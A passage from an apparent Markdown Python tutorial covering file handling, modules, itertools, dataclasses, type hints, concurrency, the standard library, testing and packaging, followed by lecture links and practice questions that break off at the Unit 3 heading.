# ── Create / read / write ──────────────────────────────────────
p.parent.mkdir(parents=True, exist_ok=True)  # make all parent dirs
p.write_text("Hello")          # write string to file
content = p.read_text()        # read file as string
p.write_bytes(b"\x00\x01")    # write bytes
p.unlink()                     # delete the file

# ── Iterate directory ──────────────────────────────────────────
for f in Path(".").iterdir():        # list everything in current dir
    print(f)

for f in Path(".").glob("**/*.py"):  # recursive glob — find all .py files
    print(f)

# ── Join paths with / operator ────────────────────────────────
base = Path("/home/user")
full = base / "projects" / "main.py"   # → Path("/home/user/projects/main.py")
```

## os & shutil

> **When to use os vs pathlib?** Use `pathlib` for path manipulation. Use `os` for env vars, process info. Use `shutil` for copy/move/delete of whole directories.

```python
import os, shutil

os.getcwd()                          # current working directory
os.listdir(".")                      # list directory contents as strings
os.makedirs("a/b/c", exist_ok=True)  # create nested dirs
os.rename("old.txt", "new.txt")      # rename or move file
os.remove("file.txt")                # delete a file
os.path.join("a", "b", "c")         # "a/b/c" (cross-platform path join)
os.path.exists("file.txt")           # True if file/dir exists
os.path.basename("/a/b/c.py")       # "c.py" — just the filename
os.path.dirname("/a/b/c.py")        # "/a/b" — just the directory
os.environ.get("HOME")               # read environment variable (None if not set)

# ── shutil — high-level file operations ───────────────────────
shutil.copy("src.txt", "dst.txt")        # copy file
shutil.copytree("src_dir", "dst_dir")    # copy entire directory tree
shutil.move("old", "new")               # move/rename file or directory
shutil.rmtree("directory")              # delete directory and all contents
```

---

# Unit 7: Modules & Packages

> **What are modules?** Any `.py` file is a module. A directory with `__init__.py` is a package. Modules let you organize code and reuse it across projects.

## Importing

> **Syntax**: `import module` · `from module import name` · `import module as alias`

```python
import math                      # import entire module → access via math.pi
from math import pi, sqrt        # import specific names → use directly as pi, sqrt
from math import *               # import all (avoid! pollutes namespace)
import numpy as np               # alias — standard for numpy

from pathlib import Path         # from package, import specific class

# ── Conditional import (try newer/faster, fallback to stdlib) ──
try:
    import ujson as json         # fast JSON (if installed)
except ImportError:
    import json                  # fallback to stdlib json

# ── Lazy import inside function (only loads when needed) ───────
def process():
    import heavy_module          # only imported the first time this function runs
    heavy_module.do_thing()      # avoids startup cost for rarely-used imports
```

## Creating Packages

```
mypackage/
├── __init__.py        ← makes it a package; runs on import; export names here
├── module1.py
├── module2.py
└── subpackage/
    ├── __init__.py
    └── module3.py
```

```python
# mypackage/__init__.py
from .module1 import ClassA          # relative import — . = this package
from .module2 import func_b
__all__ = ["ClassA", "func_b"]       # controls what 'from mypackage import *' exports

# Usage
from mypackage import ClassA         # works because __init__.py exports it
import mypackage.subpackage.module3 as m3   # deep import with alias
```

## `__name__` & `__main__`

> **Why use `if __name__ == "__main__"`?** Code inside this block only runs when the file is executed directly — NOT when it's imported by another module. Essential for reusable modules.

```python
# In module.py
def helper():
    return 42

if __name__ == "__main__":
    # Only executes when: python module.py
    # Does NOT execute when: import module
    print(helper())
```

---

# Unit 8: Advanced Python

> This unit covers powerful Python features used in production code: itertools pipelines, metaclasses, dataclasses, type hints, and concurrency.

## 8.1 Itertools & Functools

> **itertools** — lazy iterators for combinatorics, slicing, chaining. All return iterators (wrap in `list()` to see results).

```python
import itertools as it
import functools

# ── Infinite iterators ─────────────────────────────────────────
it.count(10)               # 10, 11, 12, ... (infinite — use islice to limit)
it.cycle([1,2,3])          # 1,2,3,1,2,3,... (infinite — repeats the iterable)
it.repeat(5, 3)            # 5, 5, 5 (repeat value N times)

# ── Chaining & flattening ──────────────────────────────────────
it.chain([1,2], [3,4])                   # 1,2,3,4 — combine multiple iterables
it.chain.from_iterable([[1,2],[3,4]])     # same, but from iterable of iterables

it.islice(it.count(), 5)   # [0,1,2,3,4] — take first 5 from infinite stream

# ── Combinatorics ─────────────────────────────────────────────
it.product([1,2], [3,4])             # (1,3),(1,4),(2,3),(2,4) — cartesian product
it.permutations([1,2,3], 2)          # all ordered 2-element permutations
it.combinations([1,2,3], 2)          # all unordered 2-element combinations
it.combinations_with_replacement([1,2,3], 2)  # combinations allowing repeats

# ── Grouping & filtering ───────────────────────────────────────
it.groupby(sorted(data), key=lambda x: x[0])  # group consecutive elements by key
it.takewhile(lambda x: x<5, [1,3,5,2])  # [1,3] — take while condition True
it.dropwhile(lambda x: x<5, [1,3,5,2])  # [5,2] — drop while condition True
it.filterfalse(lambda x: x%2, range(10))  # [0,2,4,6,8] — filter(False)
it.starmap(pow, [(2,10),(3,3),(10,3)])    # [1024,27,1000] — map with tuple unpacking
it.accumulate([1,2,3,4], lambda a,b: a+b)  # [1,3,6,10] — running total

# ── functools ─────────────────────────────────────────────────
functools.reduce(lambda a,b: a+b, [1,2,3,4])  # 10 — fold left
functools.partial(pow, 2)    # returns new function: 2**x
double = functools.partial(pow, 2)
double(10)  # 1024

functools.lru_cache(maxsize=128)   # memoization decorator (see 4.5)
functools.total_ordering           # define __eq__+one comparison, rest auto-filled
functools.wraps                    # preserve __name__/__doc__ in decorators
functools.singledispatch           # function overloading dispatched by argument type
```

## 8.2 Context Managers

> **Class-based context manager**: define `__enter__` (returns resource) and `__exit__` (cleanup, return False to propagate exceptions).

```python
# ── Class-based context manager ────────────────────────────────
class ManagedFile:
    def __init__(self, path, mode):
        self.path = path
        self.mode = mode

    def __enter__(self):
        self.file = open(self.path, self.mode)  # open resource
        return self.file                         # returned as `as` variable

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.file.close()    # always close, even on exception
        return False         # False = don't suppress exceptions (let them propagate)

with ManagedFile("test.txt", "r") as f:
    print(f.read())

# ── contextlib generator-based ────────────────────────────────
from contextlib import contextmanager, suppress

@contextmanager
def db_transaction(conn):
    try:
        yield conn          # code inside `with` block runs here; conn = as variable
        conn.commit()       # runs after with block completes successfully
    except Exception:
        conn.rollback()     # undo on error
        raise               # re-raise so caller knows it failed

# ── suppress — silently ignore specific exceptions ─────────────
with suppress(FileNotFoundError):
    os.remove("maybe_missing.txt")   # no crash if file doesn't exist

# ── ExitStack — dynamic number of context managers ─────────────
from contextlib import ExitStack
with ExitStack() as stack:
    files = [stack.enter_context(open(f)) for f in file_list]
    # all files auto-closed when ExitStack exits
```

## 8.3 Metaclasses

> **What is a metaclass?** The "class of a class". Just as objects are instances of classes, classes are instances of metaclasses. `type` is the default metaclass. Use metaclasses to customize class creation.

```python
# type is the default metaclass — every class is an instance of type
class MyClass:
    pass

type(MyClass)   # <class 'type'>

# ── Create class dynamically with type() ──────────────────────
MyDynamic = type(
    "MyDynamic",                    # class name
    (object,),                      # base classes tuple
    {"x": 10, "greet": lambda self: "hi"}  # attributes/methods dict
)

# ── Custom metaclass ───────────────────────────────────────────
class Singleton(type):
    """Metaclass that ensures only one instance per class"""
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super().__call__(*args, **kwargs)  # create
        return cls._instances[cls]   # return existing or new instance


class Database(metaclass=Singleton):   # use our metaclass
    def __init__(self):
        self.connection = "connected"


db1 = Database()
db2 = Database()
db1 is db2   # True — same object!

# ── __init_subclass__ (simpler than metaclass for most cases) ──
class Plugin:
    registry = []

    def __init_subclass__(cls, **kwargs):
        """Called automatically when a class inherits from Plugin"""
        super().__init_subclass__(**kwargs)
        Plugin.registry.append(cls)   # auto-register all subclasses

class MyPlugin(Plugin): pass    # automatically registered
class OtherPlugin(Plugin): pass

Plugin.registry  # [MyPlugin, OtherPlugin]
```

## 8.4 Dataclasses

> **What are dataclasses?** Auto-generate `__init__`, `__repr__`, `__eq__` (and optionally `__lt__`, `__hash__`) from class annotations. Less boilerplate for data-holding classes.

> **Syntax**: `@dataclass` decorator + type-annotated class variables

```python
from dataclasses import dataclass, field, asdict, astuple

@dataclass
class Point:
    x: float          # required argument — no default
    y: float          # required argument
    z: float = 0.0    # optional — has default value

p = Point(1.0, 2.0)
p.x                   # 1.0 — access normally
str(p)                # "Point(x=1.0, y=2.0, z=0.0)" — auto __repr__
p == Point(1.0, 2.0)  # True — auto __eq__ compares all fields

@dataclass(frozen=True)   # immutable — fields cannot be changed after creation
class FrozenPoint:
    x: float
    y: float
    # now hashable → can be used as dict key or in sets

@dataclass(order=True)    # auto-generate __lt__, __le__, __gt__, __ge__
class Version:
    major: int
    minor: int
    patch: int

@dataclass
class Inventory:
    items: list = field(default_factory=list)   # mutable default MUST use field()
    counts: dict = field(default_factory=dict)
    _id: int = field(default=0, repr=False, compare=False)  # exclude from repr/compare

    def __post_init__(self):
        """Runs automatically after __init__ — for validation or derived fields"""
        if self._id == 0:
            import random
            self._id = random.randint(1000, 9999)  # assign random ID

# ── Conversion ─────────────────────────────────────────────────
asdict(p)     # {"x": 1.0, "y": 2.0, "z": 0.0} — to dict (recursive)
astuple(p)    # (1.0, 2.0, 0.0) — to tuple
```

## 8.5 Type Hints & Annotations

> **Why type hints?** Not enforced at runtime, but caught by type checkers (mypy, pyright/pylance), IDEs, and linters. Makes code self-documenting and easier to maintain.

> **Syntax**: `variable: type` · `def func(param: type) -> return_type:`

```python
from typing import (
    List, Dict, Tuple, Set, Optional, Union,
    Callable, Any, TypeVar, Generic, Iterator,
    Sequence, Mapping, Iterable
)
# Python 3.9+: use lowercase list, dict, tuple directly
# Python 3.10+: use X | Y instead of Union[X, Y]

def greet(name: str) -> str:          # param: str, returns str
    return f"Hello, {name}"

def process(items: list[int]) -> dict[str, int]:   # Python 3.9+
    return {"sum": sum(items)}

# ── Optional (value or None) ───────────────────────────────────
def find(name: str) -> str | None:    # Python 3.10+ Union syntax
    ...

def find_old(name: str) -> Optional[str]:   # equivalent older style
    ...

# ── Callable type hint ────────────────────────────────────────
def apply(func: Callable[[int], str], value: int) -> str:
    # func takes int, returns str
    return func(value)

# ── TypeVar — generic functions ───────────────────────────────
T = TypeVar("T")           # T can be any type

def first(lst: list[T]) -> T:   # input and output have same type
    return lst[0]

# ── Generic classes ───────────────────────────────────────────
class Stack(Generic[T]):
    def __init__(self) -> None:
        self._items: list[T] = []   # type of items matches the T

    def push(self, item: T) -> None:
        self._items.append(item)

    def pop(self) -> T:
        return self._items.pop()

# ── TypedDict — typed dictionaries ────────────────────────────
from typing import TypedDict

class Movie(TypedDict):
    title: str
    year: int
    rating: float

# ── Protocol — structural subtyping (duck typing with types) ──
from typing import Protocol

class Drawable(Protocol):
    def draw(self) -> None: ...   # any class with draw() satisfies this

def render(item: Drawable) -> None:
    item.draw()   # works for ANY class with draw() — no inheritance needed
```

## 8.6 Concurrency — Threads, Async, Multiprocessing

> **Rule of thumb**: Use `asyncio` for I/O-bound work (network, disk). Use `multiprocessing` for CPU-bound work. Use `threading` for simple I/O tasks with existing blocking libraries.

### Threading

```python
import threading

def worker(n):
    print(f"Thread {n} starting")
    time.sleep(1)                  # simulate I/O wait
    print(f"Thread {n} done")

threads = [threading.Thread(target=worker, args=(i,)) for i in range(5)]
for t in threads:
    t.start()    # start all threads
for t in threads:
    t.join()     # wait for all to finish

# ── Thread-safe shared state with Lock ────────────────────────
counter = 0
lock = threading.Lock()   # mutex — only one thread can hold it at a time

def increment():
    global counter
    with lock:             # acquire lock → only one thread runs this block
        counter += 1       # protected critical section

# ⚠️ GIL (Global Interpreter Lock): Python threads don't truly parallelize CPU work
# Threading is only useful for I/O-bound tasks (network, file, sleep)
```

### asyncio

> **What is asyncio?** Single-threaded cooperative concurrency. Functions declare with `async def` and `await` to yield control while waiting for I/O — much faster than threads for many concurrent connections.

```python
import asyncio

async def fetch(url):
    await asyncio.sleep(1)   # simulate async I/O (non-blocking wait)
    return f"data from {url}"

async def main():
    # Run all three concurrently — total time ≈ 1s, not 3s
    results = await asyncio.gather(
        fetch("url1"),
        fetch("url2"),
        fetch("url3"),
    )
    print(results)

asyncio.run(main())   # entry point — runs the event loop

# ── Async context manager ─────────────────────────────────────
async with aiohttp.ClientSession() as session:
    async with session.get(url) as response:
        data = await response.json()   # await each I/O operation

# ── Async generator ───────────────────────────────────────────
async def arange(n):
    for i in range(n):
        await asyncio.sleep(0)   # yield control to event loop
        yield i

async for x in arange(5):
    print(x)
```

### Multiprocessing

> **Why multiprocessing?** Bypasses the GIL — each process has its own Python interpreter and memory. True CPU parallelism for heavy computation.

```python
from multiprocessing import Pool, Process, Queue, cpu_count

def cpu_task(n):
    return sum(i**2 for i in range(n))   # heavy CPU work

# ── Process pool — true parallelism, no GIL ───────────────────
with Pool(processes=cpu_count()) as pool:
    results = pool.map(cpu_task, [10**6]*8)   # 8 tasks across all CPUs

# ── Single process ────────────────────────────────────────────
p = Process(target=cpu_task, args=(10**6,))
p.start()   # start in background
p.join()    # wait for it to finish
```

---

# Unit 9: Standard Library Highlights

> Python's motto: "batteries included". The standard library covers nearly everything — no third-party packages needed for most common tasks.

```python
# ── datetime — dates, times, durations ────────────────────────
from datetime import datetime, date, timedelta
now = datetime.now()                            # current local datetime
today = date.today()                            # current date only
d = datetime(2026, 3, 9, 14, 30)               # specific datetime
d.strftime("%Y-%m-%d %H:%M")                   # format to string "2026-03-09 14:30"
datetime.strptime("2026-03-09", "%Y-%m-%d")    # parse string → datetime
d + timedelta(days=30)                          # arithmetic — add 30 days

# ── json — serialize/deserialize ──────────────────────────────
import json
data = {"name": "Alice", "scores": [1, 2, 3]}
json_str = json.dumps(data, indent=2)           # dict → JSON string (pretty)
loaded = json.loads(json_str)                   # JSON string → dict
with open("data.json", "w") as f:
    json.dump(data, f, indent=2)               # dict → JSON file

# ── re — regular expressions ──────────────────────────────────
import re
re.match(r'\d+', '123abc')         # match only at START of string
re.search(r'\d+', 'abc123')        # match ANYWHERE in string
re.findall(r'\d+', 'a1b2c3')       # → ['1','2','3'] — all matches
re.sub(r'\d', '#', 'a1b2c3')       # → 'a#b#c#' — replace matches
re.split(r'[,;]', 'a,b;c')         # → ['a','b','c'] — split on pattern
pat = re.compile(r'\d+')           # pre-compile for reuse (faster in loops)

# ── collections ───────────────────────────────────────────────
from collections import Counter, defaultdict, deque, OrderedDict, namedtuple, ChainMap
Counter("abracadabra").most_common(2)  # [('a', 5), ('b', 2)]
defaultdict(int)                        # dict that auto-creates missing keys as 0
deque(maxlen=5)                         # circular buffer — auto-drops oldest at maxlen
ChainMap(dict1, dict2)                 # unified view — searches dict1 first, then dict2

# ── heapq — min-heap (priority queue) ─────────────────────────
import heapq
heap = [3,1,4,1,5,9]
heapq.heapify(heap)                  # convert list to heap in-place, O(n)
heapq.heappush(heap, 2)              # push item, O(log n)
heapq.heappop(heap)                  # pop SMALLEST item, O(log n) → 1
heapq.nlargest(3, data)              # 3 largest items efficiently
heapq.nsmallest(3, data)             # 3 smallest items

# ── bisect — binary search on sorted lists ────────────────────
import bisect
lst = [1, 3, 5, 7, 9]
bisect.bisect_left(lst, 4)           # 2 — index where 4 would be inserted
bisect.insort(lst, 4)                # insert 4 maintaining sorted order

# ── random ────────────────────────────────────────────────────
import random
random.random()                      # float in [0.0, 1.0)
random.randint(1, 10)                # int in [1, 10] inclusive
random.choice([1,2,3])              # random element from list
random.choices([1,2,3], weights=[1,2,1], k=5)  # weighted random choices with replacement
random.shuffle(lst)                  # shuffle list in-place
random.sample(range(100), 10)        # 10 unique random items — no replacement

# ── math ──────────────────────────────────────────────────────
import math
math.pi, math.e, math.inf, math.nan  # constants
math.sqrt(16)                        # 4.0
math.floor(3.7)                      # 3 — round down
math.ceil(3.2)                       # 4 — round up
math.factorial(10)                   # 3628800
math.log(100, 10)                    # 2.0 — log base 10
math.gcd(12, 8)                      # 4 — greatest common divisor
math.comb(10, 3)                     # 120 — combinations C(10,3)
math.perm(10, 3)                     # 720 — permutations P(10,3)

# ── statistics ────────────────────────────────────────────────
import statistics
data = [1,2,3,4,5,6,7,8,9,10]
statistics.mean(data)                # 5.5 — arithmetic mean
statistics.median(data)              # 5.5 — middle value
statistics.mode([1,2,2,3])           # 2 — most common value
statistics.stdev(data)               # sample standard deviation
statistics.variance(data)            # sample variance

# ── string module ─────────────────────────────────────────────
import string
string.ascii_letters      # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
string.digits             # '0123456789'
string.punctuation        # '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
string.Template("Hello, $name!").substitute(name="Alice")  # "Hello, Alice!"

# ── sys — interpreter internals ───────────────────────────────
import sys
sys.argv            # list of command-line arguments (argv[0] = script name)
sys.path            # list of directories Python searches for modules
sys.exit(0)         # exit program with code 0 (success) or non-zero (error)
sys.stdin, sys.stdout, sys.stderr   # standard streams
sys.version         # e.g. "3.13.0"
sys.platform        # 'darwin' / 'linux' / 'win32'
sys.getsizeof(obj)  # memory size in bytes

# ── subprocess — run external commands ───────────────────────
import subprocess
result = subprocess.run(["ls", "-la"], capture_output=True, text=True)
print(result.stdout)   # standard output as string
print(result.returncode)  # 0 = success

# ── struct — binary data packing ──────────────────────────────
import struct
packed = struct.pack(">IH", 1024, 255)    # big-endian: uint32 + uint16 → bytes
struct.unpack(">IH", packed)              # → (1024, 255) — unpack back to Python
```

---

# Unit 10: Testing

> **Why test?** Tests catch bugs before users do, document expected behavior, and let you refactor safely. Python has `unittest` built-in and `pytest` as the industry standard.

## unittest

> **Syntax**: Subclass `unittest.TestCase`, name methods `test_*`, run with `unittest.main()` or `pytest`

```python
import unittest

def add(a, b):
    return a + b

class TestAdd(unittest.TestCase):
    def test_integers(self):
        self.assertEqual(add(2, 3), 5)          # assert equal

    def test_floats(self):
        self.assertAlmostEqual(add(0.1, 0.2), 0.3, places=1)  # float comparison

    def test_negative(self):
        self.assertEqual(add(-1, -1), -2)

    def test_raises(self):
        with self.assertRaises(TypeError):       # assert exception is raised
            add("a", 1)

    def setUp(self):
        """Runs BEFORE each test method — set up test fixtures"""
        self.data = [1, 2, 3]

    def tearDown(self):
        """Runs AFTER each test method — cleanup"""
        pass

    @unittest.skip("not implemented yet")    # skip this test
    def test_todo(self):
        pass

if __name__ == "__main__":
    unittest.main()
```

## pytest (Industry Standard)

> **Install**: `pip install pytest pytest-cov`
> **Syntax**: Plain functions named `test_*`, plain `assert` statements — no special methods needed

```python
# test_math.py
import pytest

def test_add():
    assert 1 + 1 == 2          # plain assert — no assertEqual needed

def test_divide_by_zero():
    with pytest.raises(ZeroDivisionError):   # expect this exception
        1 / 0

# ── Fixtures — reusable setup code ────────────────────────────
@pytest.fixture
def sample_data():
    return [1, 2, 3, 4, 5]    # injected into test function by argument name

def test_sum(sample_data):
    assert sum(sample_data) == 15  # sample_data fixture auto-injected

# ── Parametrize — run same test with multiple inputs ──────────
@pytest.mark.parametrize("input,expected", [
    (2, 4),
    (3, 9),
    (4, 16),
    (-2, 4),
])
def test_square(input, expected):
    assert input**2 == expected   # runs 4 times with each pair

# ── Marks — categorize and filter tests ───────────────────────
@pytest.mark.slow          # custom mark — run with: pytest -m slow
def test_heavy():
    pass

# ── Mocking — replace real objects with fakes ─────────────────
from unittest.mock import Mock, patch

def test_with_mock():
    mock_db = Mock()
    mock_db.query.return_value = [1, 2, 3]  # fake return value
    result = mock_db.query("SELECT *")
    assert result == [1, 2, 3]
    mock_db.query.assert_called_once_with("SELECT *")  # verify call

@patch("module.requests.get")           # replace requests.get with a Mock
def test_api_call(mock_get):
    mock_get.return_value.json.return_value = {"status": "ok"}
    result = call_api()
    assert result["status"] == "ok"
```

```bash
pytest                     # run all tests in current directory
pytest test_math.py        # run specific file
pytest -v                  # verbose — show each test name
pytest -k "test_add"       # run only tests matching name pattern
pytest --cov=mymodule      # measure code coverage
pytest -m "not slow"       # exclude tests marked @pytest.mark.slow
```

---

# Unit 11: Virtual Environments & Packaging

> **Why virtual environments?** Each project needs its own package versions — venv isolates dependencies so they don't conflict. Essential for any real Python project.

## Virtual Environments

```bash
# ── Create & activate ──────────────────────────────────────────
python3 -m venv .venv              # create venv in .venv directory
source .venv/bin/activate          # activate — Mac/Linux
.venv\Scripts\activate             # activate — Windows
deactivate                         # deactivate — return to system Python

# ── pip — package manager ─────────────────────────────────────
pip install package                # install latest version
pip install package==1.2.3         # install specific version
pip install "package>=1.0,<2.0"    # install within version range
pip install -r requirements.txt    # install all from file
pip freeze > requirements.txt      # export current env to file
pip list                           # show all installed packages
pip show package                   # show details (version, location, deps)
pip uninstall package              # remove package
pip install --upgrade package      # upgrade to latest
```

## pyproject.toml (Modern Packaging)

> **What is pyproject.toml?** The modern standard (PEP 517/518) for declaring project metadata and dependencies. Replaces `setup.py` and `setup.cfg`.

```toml
[build-system]
requires = ["setuptools>=61"]
build-backend = "setuptools.backends.legacy:build"

[project]
name = "mypackage"                 # package name (used on PyPI)
version = "0.1.0"                  # semantic version
description = "My awesome package"
requires-python = ">=3.10"         # minimum Python version
dependencies = [                   # runtime dependencies
    "requests>=2.28",
    "numpy>=1.23",
]

[project.optional-dependencies]
dev = ["pytest", "black", "mypy"]  # install with: pip install mypackage[dev]

[project.scripts]
mycli = "mypackage.cli:main"       # creates CLI command: mycli = mypackage/cli.py main()
```

## Tools

```bash
# ── Code formatting & linting ─────────────────────────────────
black .                     # auto-format all Python files (opinionated)
isort .                     # sort import statements automatically
ruff check .                # extremely fast linter (replaces flake8/pylint)

# ── Type checking ─────────────────────────────────────────────
mypy mymodule.py            # static type checker — checks type hints

# ── Build & publish to PyPI ───────────────────────────────────
pip install build twine
python -m build             # creates dist/mypackage-0.1.0.tar.gz + .whl
twine upload dist/*         # upload to PyPI (needs ~/.pypirc credentials)
```

---

# Unit 12: Miscellaneous & Python Internals

> Understanding how Python works under the hood helps you write faster, more memory-efficient, idiomatic code.

## Python Memory Model

```python
# Everything is an object — even integers, functions, and classes
x = 42
id(x)                  # memory address of the object
sys.getrefcount(x)     # how many references point to this object

# ── Interning — Python caches small ints and short strings ────
a = 256; b = 256
a is b    # True — same cached object (Python interns ints -5 to 256)

a = 257; b = 257
a is b    # False — different objects (outside cache range)

# ── Shallow vs Deep copy ───────────────────────────────────────
import copy
lst = [[1, 2], [3, 4]]
shallow = lst.copy()           # outer list copied, inner lists still shared
shallow[0][0] = 99             # modifies ORIGINAL inner list too!
deep = copy.deepcopy(lst)      # everything recursively copied — fully independent
deep[0][0] = 99                # original unaffected ✓
```

## `__slots__`

> **Why use __slots__?** By default, each instance stores attributes in a `__dict__`. `__slots__` replaces `__dict__` with a fixed-size struct — saves memory (~40–50%) for classes with many instances.

```python
class Efficient:
    __slots__ = ["x", "y"]   # only these attributes allowed — no __dict__
    def __init__(self, x, y):
        self.x = x
        self.y = y

e = Efficient(1, 2)
e.z = 3   # AttributeError! — can't add arbitrary attributes
```

## Walrus, Match, and Modern Syntax

```python
# ── Python 3.8+ Walrus Operator := ───────────────────────────
import re
# assign AND test in one expression — avoids calling the function twice
if m := re.search(r'\d+', text):
    print(m.group())    # m is already bound here

while chunk := f.read(8192):   # read and check at once
    process(chunk)

# ── Python 3.10+ match — Structural Pattern Matching ─────────
def process(command):
    match command:
        case {"action": "move", "direction": d}:  # dict pattern — extracts d
            move(d)
        case {"action": "attack", "weapon": w}:   # dict pattern — extracts w
            attack(w)
        case [x, y]:                               # list pattern — extracts x, y
            go_to(x, y)
        case str() as s if s.startswith("!"):      # type + guard condition
            handle_command(s[1:])
        case _:                                    # wildcard — default case
            print("unknown")

# ── Python 3.12+ Type Parameter Syntax (PEP 695) ─────────────
def first[T](lst: list[T]) -> T:   # [T] = type parameter (no TypeVar needed)
    return lst[0]

class Stack[T]:                     # generic class syntax
    def push(self, item: T) -> None: ...
```

## Useful Built-in Functions (Complete)

> **Syntax**: These are always available — no import needed.

```python
# ── Math ──────────────────────────────────────────────────────
abs(-5)                   # 5 — absolute value
round(3.14159, 2)         # 3.14 — round to N decimal places
pow(2, 10)                # 1024 — same as 2**10
pow(2, 10, 1000)          # 24 — modular exponentiation: (2**10) % 1000
divmod(17, 5)             # (3, 2) — quotient and remainder at once
min(1, 2, 3)              # 1 — minimum value
max(1, 2, 3)              # 3 — maximum value
sum([1, 2, 3])            # 6 — sum all numbers

# ── Sequences ─────────────────────────────────────────────────
len([1,2,3])                       # 3 — length of any sequence/collection
range(10)                          # 0..9 lazy range
range(1, 10, 2)                    # 1, 3, 5, 7, 9 (start, stop, step)
zip([1,2], [3,4])                  # → [(1,3),(2,4)] — pair elements from two iterables
zip(*matrix)                       # transpose 2D list (unzip)
enumerate(["a","b"], start=1)      # → [(1,"a"),(2,"b")] — add index to iterable
sorted([3,1,2])                    # [1,2,3] — returns new sorted list
sorted(data, key=lambda x: x[1])   # sort by key function
reversed([1,2,3])                  # lazy reversed iterator
list(reversed([1,2,3]))            # [3,2,1]

# ── Type checks & reflection ──────────────────────────────────
type(x)                            # exact type: <class 'int'>
isinstance(x, int)                 # True if x is int or subclass — preferred
issubclass(Dog, Animal)            # True if Dog inherits from Animal
callable(obj)                      # True if obj has __call__ (is callable)
hasattr(obj, "method")             # True if obj has attribute "method"
getattr(obj, "method", default)    # get attribute, return default if missing
setattr(obj, "attr", value)        # set attribute dynamically
delattr(obj, "attr")               # delete attribute

# ── Object inspection ─────────────────────────────────────────
dir(obj)        # list of all attribute/method names
vars(obj)       # obj.__dict__ — instance attributes as dict
id(obj)         # memory address as integer
hash(obj)       # hash value (only for hashable objects)

# ── Functional ────────────────────────────────────────────────
map(func, iterable)               # lazy: apply func to each element
filter(func, iterable)            # lazy: keep where func returns True
all([True, True, True])           # True — all elements truthy
any([False, False, True])         # True — at least one element truthy
next(iterator)                    # advance iterator, raise StopIteration if done
next(iterator, default)           # advance iterator, return default if done

# ── I/O ───────────────────────────────────────────────────────
print(*objects, sep=' ', end='\n', file=sys.stdout)   # print with options
input(prompt)                     # read line from stdin (always returns str)
open(file, mode, encoding)        # open file (use with `with`)
repr(obj)                         # developer string representation
str(obj)                          # user-friendly string representation
format(value, format_spec)        # e.g. format(3.14, ".2f") → "3.14"

# ── Number bases ──────────────────────────────────────────────
bin(255)          # '0b11111111' — binary string
oct(255)          # '0o377' — octal string
hex(255)          # '0xff' — hex string
int('ff', 16)     # 255 — parse hex string to int
chr(65)           # 'A' — unicode code point → character
ord('A')          # 65 — character → unicode code point

# ── Advanced (use with caution) ───────────────────────────────
eval("2 + 2")     # 4 — evaluate Python expression from string ⚠️ NEVER with user input
exec("x = 42")    # execute Python statement string ⚠️ NEVER with user input
globals()         # global namespace as dict
locals()          # local namespace as dict
```

## Python Internals: How CPython Works

```
Source Code (.py)
     ↓ compiled by CPython
Bytecode (.pyc in __pycache__)
     ↓ executed by
CPython VM (stack-based virtual machine)
     ↓ every Python object is a
PyObject* (C struct with type pointer + ref count)

Key concepts:
- Reference counting: each object tracks how many references point to it
- Cyclic GC: detects and cleans up reference cycles (a → b → a)
- GIL (Global Interpreter Lock): only one thread runs Python bytecode at a time
- Frame objects: created for each function call, hold locals + bytecode pointer
- dis.dis(func): shows bytecode instructions for any function
```

```python
import dis
def add(a, b): return a + b
dis.dis(add)    # shows bytecode — great for understanding performance
```

```python
import dis
import sys

def add(a, b):
    return a + b

dis.dis(add)   # show bytecode
# 2           0 RESUME                   0
# 3           2 LOAD_FAST                0 (a)
#             4 LOAD_FAST                1 (b)
#             6 BINARY_OP               0 (+)
#            10 RETURN_VALUE

# Code objects
add.__code__.co_varnames   # ('a', 'b')
add.__code__.co_argcount   # 2
add.__code__.co_filename   # source file
```

---

# 🎬 Video Lectures & Playlists

## Beginner

| Topic | Channel | Link |
|-------|---------|------|
| Python Full Course (6hr) | freeCodeCamp | [YouTube](https://youtu.be/rfscVS0vtbw) |
| Python Basics | Corey Schafer | [Playlist](https://www.youtube.com/playlist?list=PL-osiE80TeTskrapNbzXhwoFUiLCjGgY7) |
| 100 Days of Python | Dr. Angela Yu | [Udemy](https://www.udemy.com/course/100-days-of-code/) |
| Python Tutorial | Tech With Tim | [YouTube](https://youtu.be/sxTmJE4k0ho) |

## Intermediate

| Topic | Channel | Link |
|-------|---------|------|
| OOP in Python | Corey Schafer | [Playlist](https://www.youtube.com/playlist?list=PL-osiE80TeTsqhIuOqKhwlXsIBIdSeYtc) |
| Decorators | Corey Schafer | [YouTube](https://youtu.be/FsAPt_9Bf3U) |
| Generators | David Beazley | [PyCon](https://youtu.be/5-qadlG7tWo) |
| Closures | Corey Schafer | [YouTube](https://youtu.be/swU3c34d2NQ) |
| Context Managers | Corey Schafer | [YouTube](https://youtu.be/-aKFBoZpiqA) |

## Advanced

| Topic | Channel | Link |
|-------|---------|------|
| Python Internals | CPython Dev | [PyCon 2023](https://youtu.be/cSSpnq362Bk) |
| Metaclasses | Armin Ronacher | [YouTube](https://youtu.be/sPiWg5jSoZI) |
| asyncio | Raymond Hettinger | [PyCon](https://youtu.be/9zinZmE3Ogk) |
| Concurrency | David Beazley | [PyCon](https://youtu.be/MCs5OvhV9S4) |
| Type Hints | Guido van Rossum | [PyCon](https://youtu.be/2wDvzy6Hgxg) |

## Full Courses

| Platform | Course | Link |
|----------|--------|------|
| YouTube | CS50P (Harvard) | [YouTube](https://youtu.be/nLRL_NcnK-4) |
| Udemy | Python Bootcamp (Jose Portilla) | [Udemy](https://www.udemy.com/course/complete-python-bootcamp/) |
| Real Python | Tutorials | [realpython.com](https://realpython.com) |
| Fluent Python | O'Reilly Book | [O'Reilly](https://www.oreilly.com/library/view/fluent-python-2nd/9781492056348/) |

---

# 📝 Practice Questions

## Unit 1 — Basics

1. What is the output of `bool([]) or bool({}) or bool(0)`?
2. What does `type(True) == int` evaluate to? Why?
3. Write a one-liner to check if a string is a palindrome.
4. Explain the difference between `is` and `==`.
5. What is `sys.getsizeof([])` vs `sys.getsizeof(())`?

## Unit 2 — Data Structures

1. Why is `{} ` a dict, not a set? How do you create an empty set?
2. Write a list comprehension that flattens `[[1,2],[3,4],[5,6]]`.
3. What is the time complexity of `x in dict` vs `x in list`?
4. Implement a word frequency counter using `Counter`.
5. When would you use a `deque` instead of a `list`?

## Unit 3 — OOP

